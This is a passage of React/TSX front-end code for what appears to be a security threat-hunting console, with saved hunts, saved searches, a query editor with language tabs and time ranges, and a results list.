              </button>
            </div>
            <SavedHuntsPanel
              items={savedHuntsItems}
              isLoading={savedHuntsState.isLoading}
              error={savedHuntsError}
              selectedId={activeSavedHuntId}
              onRun={handleRunSavedHunt}
              onDelete={handleDeleteSavedHunt}
              onRetry={() => void savedHuntsState.mutate()}
            />
          </div>

          <div className="overflow-hidden rounded-xl border border-slate-800/80 bg-slate-900/40">
            <div className="flex items-center justify-between border-b border-slate-800/80 px-3 py-2.5">
              <h3 className="text-xs font-semibold uppercase tracking-wide text-slate-300">
                Saved searches
              </h3>
              <button
                onClick={() => {
                  setActiveSavedId(null);
                  setActiveSavedHuntId(null);
                  setHeroDismissed(true);
                  setQuery(STARTERS[language]);
                  lastStarter.current = STARTERS[language];
                }}
                className="text-xs text-slate-400 hover:text-slate-200"
              >
                + New
              </button>
            </div>
            <SavedList
              items={savedItems}
              isLoading={savedState.isLoading}
              error={savedError}
              selectedId={activeSavedId}
              onSelect={handleSelect}
              onDelete={handleDelete}
              onRetry={() => void savedState.mutate()}
            />
          </div>
        </aside>

        {/* Main: editor + results */}
        <section className="col-span-12 space-y-4 lg:col-span-9">
          {nlExplanation && (
            <div className="rounded-lg border border-emerald-500/20 bg-emerald-500/5 px-4 py-2.5 text-xs text-emerald-200">
              <span className="font-semibold uppercase tracking-wider text-emerald-400">
                Translator:
              </span>{' '}
              {nlExplanation}
            </div>
          )}

          {/* Editor */}
          <div className="overflow-hidden rounded-xl border border-slate-800/80 bg-slate-900/40">
            <div className="flex flex-wrap items-center gap-2 border-b border-slate-800/80 px-3 py-2">
              {/* Language tabs */}
              <div className="flex rounded-lg border border-slate-800/80 bg-slate-950/40 p-0.5">
                {LANGS.map((l) => (
                  <button
                    key={l.id}
                    onClick={() => setLanguage(l.id)}
                    className={clsx(
                      'rounded-md px-2.5 py-1 text-xs font-medium transition-colors',
                      language === l.id
                        ? 'bg-slate-800 text-white shadow-sm'
                        : 'text-slate-400 hover:text-slate-200',
                    )}
                  >
                    {l.label}
                  </button>
                ))}
              </div>

              {/* Time range */}
              <div className="ml-2 flex items-center gap-1.5 text-xs text-slate-400">
                <svg className="h-3.5 w-3.5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 6v6h4.5m4.5 0a9 9 0 11-18 0 9 9 0 0118 0z" />
                </svg>
                <select
                  value={preset}
                  onChange={(e) => setPreset(e.target.value)}
                  className="rounded-md border border-slate-700/70 bg-slate-950/40 px-2 py-1 text-xs text-slate-200 focus:border-emerald-500/40 focus:outline-none"
                >
                  {TIME_PRESETS.map((p) => (
                    <option key={p.id} value={p.id}>
                      {p.label}
                    </option>
                  ))}
                </select>
              </div>

              <div className="ml-auto flex items-center gap-2">
                <button
                  onClick={handleSaveNLHunt}
                  className={clsx(
                    'rounded-md border px-3 py-1.5 text-xs font-medium transition-colors',
                    nlSubmittedQuery
                      ? 'border-emerald-500/40 bg-emerald-500/10 text-emerald-200 hover:border-emerald-500/70 hover:bg-emerald-500/20'
                      : 'border-slate-700/70 bg-slate-800/50 text-slate-200 hover:border-slate-600 hover:bg-slate-700/40',
                  )}
                  title={nlSubmittedQuery ? 'Save this NL hunt' : 'Save this raw query'}
                >
                  {nlSubmittedQuery ? 'Save hunt' : 'Save'}
                </button>
                <button
                  onClick={handleRun}
                  disabled={running || !query.trim()}
                  className={clsx(
                    'flex items-center gap-2 rounded-md px-3.5 py-1.5 text-xs font-semibold transition-colors',
                    running || !query.trim()
                      ? 'cursor-not-allowed bg-slate-800 text-slate-500'
                      : 'bg-emerald-500 text-emerald-950 hover:bg-emerald-400',
                  )}
                >
                  {running ? (
                    <>
                      <span className="h-3 w-3 animate-spin rounded-full border-2 border-emerald-950 border-t-transparent" />
                      Running…
                    </>
                  ) : (
                    <>▶ Run hunt</>
                  )}
                </button>
              </div>
            </div>

            <div className="bg-[#0d1117]">
              <MonacoEditor
                height="280px"
                language={LANGS.find((l) => l.id === language)?.monaco ?? 'plaintext'}
                value={query}
                onChange={(v) => setQuery(v ?? '')}
                onMount={(editor) => {
                  editorRef.current = editor;
                }}
                theme="vs-dark"
                options={{
                  minimap: { enabled: false },
                  fontSize: 13,
                  fontFamily:
                    "'JetBrains Mono', 'Fira Code', ui-monospace, monospace",
                  lineNumbers: 'on',
                  scrollBeyondLastLine: false,
                  renderLineHighlight: 'line',
                  smoothScrolling: true,
                  tabSize: 2,
                  wordWrap: 'on',
                }}
              />
            </div>
          </div>

          {/* Results */}
          <div className="overflow-hidden rounded-xl border border-slate-800/80 bg-slate-900/40">
            <div className="flex flex-wrap items-center justify-between gap-2 border-b border-slate-800/80 px-4 py-2.5">
              <h3 className="text-sm font-semibold text-slate-200">
                Hunt results
                {results && (
                  <span className="ml-2 text-xs font-normal text-slate-400">
                    {results.total.toLocaleString()} hits ·{' '}
                    {results.took.toLocaleString()}ms
                  </span>
                )}
              </h3>
              {results && results.hits.length > 0 && (
                <button
                  onClick={() =>
                    copyToClipboard(JSON.stringify(results.hits, null, 2))
                  }
                  className="text-xs text-slate-400 transition-colors hover:text-slate-200"
                >
                  Copy all as JSON
                </button>
              )}
            </div>

            {running ? (
              <div className="space-y-2 p-4">
                <Skeleton className="h-12 w-full rounded-lg" />
                <Skeleton className="h-12 w-full rounded-lg" />
                <Skeleton className="h-12 w-full rounded-lg" />
              </div>
            ) : !results ? (
              <EmptyState
                title="Press Run to begin"
                description="Tip: ask a question above, pick a saved hunt, or pivot from an alert."
              />
            ) : results.hits.length === 0 ? (
              <div className="flex flex-col items-center justify-center px-6 py-10">
                <p className="text-sm font-medium text-emerald-300">
                  No matches in the selected window
                </p>
                <p className="mt-1 text-xs text-slate-500">
                  {runError
                    ? 'Backend unreachable — but here is the parsed query so you can refine it.'
                    : nlSubmittedQuery
                      ? 'The translator parsed your question (see editor) but found no events. Try a wider time range.'
                      : 'Either the data is clean, or the query is too tight.'}
                </p>
              </div>
            ) : (
              <ul className="divide-y divide-slate-800/60">
                {results.hits.map((r) => (
                  <ResultRow key={r.id} result={r} />
                ))}
              </ul>
            )}
          </div>
        </section>
      </div>
    </div>
  );
}
